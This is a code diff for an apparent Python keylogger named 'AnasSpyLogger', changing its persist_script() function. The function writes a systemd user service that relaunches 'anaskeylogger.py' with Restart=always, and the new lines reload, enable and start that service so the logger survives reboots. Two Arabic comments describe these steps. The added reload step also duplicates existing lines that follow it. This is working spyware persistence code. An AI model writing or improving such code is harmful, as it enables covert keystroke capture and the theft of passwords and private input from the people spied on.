@@ -148,6 +148,7 @@ def persist_script():
         os.makedirs(user_service_path, exist_ok=True)
 
         service_file_path = os.path.join(user_service_path, "anaspylogger.service")
+        script_dir = os.path.dirname(os.path.abspath(__file__))
 
         service_content = f"""[Unit]
 Description=AnasSpyLogger Persistence Service
@@ -155,7 +156,8 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart=/usr/bin/python3 {os.path.abspath(__file__)}
+WorkingDirectory={script_dir}
+ExecStart=/usr/bin/python3 {os.path.join(script_dir, "anaskeylogger.py")}
 Restart=always
 RestartSec=10
 
@@ -168,6 +170,16 @@ WantedBy=default.target
             f.write(service_content)
 
         print(f"[+] Service created: {service_file_path}")
+
+        # إعادة تحميل الخدمات الخاصة بالمستخدم
+        subprocess.run(["systemctl", "--user", "daemon-reload"])
+
+        # تفعيل وتشغيل الخدمة
+        subprocess.run(["systemctl", "--user", "enable", "anaspylogger.service"])
+        subprocess.run(["systemctl", "--user", "start", "anaspylogger.service"])
+
+        print("[+] Service enabled and started.")
+
 
         # إعادة تحميل الخدمات الخاصة بالمستخدم
         subprocess.run(["systemctl", "--user", "daemon-reload"])
